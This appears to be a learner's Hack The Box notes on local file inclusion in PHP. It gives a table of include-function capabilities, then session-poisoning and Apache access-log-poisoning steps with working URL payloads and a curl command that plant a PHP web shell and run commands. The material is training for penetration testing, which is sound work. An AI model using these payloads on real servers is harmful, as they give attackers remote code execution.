| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `include`                    |        ✅         |      ✅      |       ✅        |
## PHP Session Poisoning
![](Pasted%20image%2020260701124852.png)

```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
![](Pasted%20image%2020260701124906.png)

```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Now, let's include the session file once again to look at the contents:
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
![](Pasted%20image%2020260701125031.png)

```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```
![](Pasted%20image%2020260701125123.png)
## Server Log Poisoning

```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```
![](Pasted%20image%2020260701125434.png)

![](Pasted%20image%2020260701125457.png)
![](Pasted%20image%2020260701125520.png)

We may also poison the log by sending a request through cURL, as follows:

```shell
3kjS@htb[/htb]$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison 
3kjS@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```
![](Pasted%20image%2020260701125549.png)
